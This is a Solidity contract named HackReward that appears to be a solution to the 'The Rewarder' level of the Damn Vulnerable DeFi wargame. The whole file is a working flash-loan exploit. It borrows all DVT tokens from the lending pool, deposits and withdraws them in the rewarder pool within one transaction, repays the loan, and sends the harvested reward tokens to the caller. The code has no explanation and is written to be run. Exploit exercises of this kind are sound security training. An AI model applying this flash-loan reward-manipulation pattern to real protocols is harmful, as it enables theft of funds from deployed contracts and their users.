// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract HackReward {

    TheRewarderPool public rp;
    RewardToken public rt;
    DamnValuableToken public dvt;
    FlashLoanerPool public flp;

    constructor(address _rp, address _rt, address _dvt, address _flp) {
        rp = TheRewarderPool(_rp);
        rt = RewardToken(_rt);
        dvt = DamnValuableToken(_dvt);
        flp = FlashLoanerPool(_flp);
    }

    fallback() external{
        uint balance = dvt.balanceOf(address(this));
        dvt.approve(address(rp), balance);
        rp.deposit(balance);
        rp.withdraw(balance);
        dvt.transfer(address(flp), balance);
    }

    function hack() public {
        flp.flashLoan(dvt.balanceOf(address(flp)));
        rt.transfer(msg.sender, rt.balanceOf(address(this)));
    }


}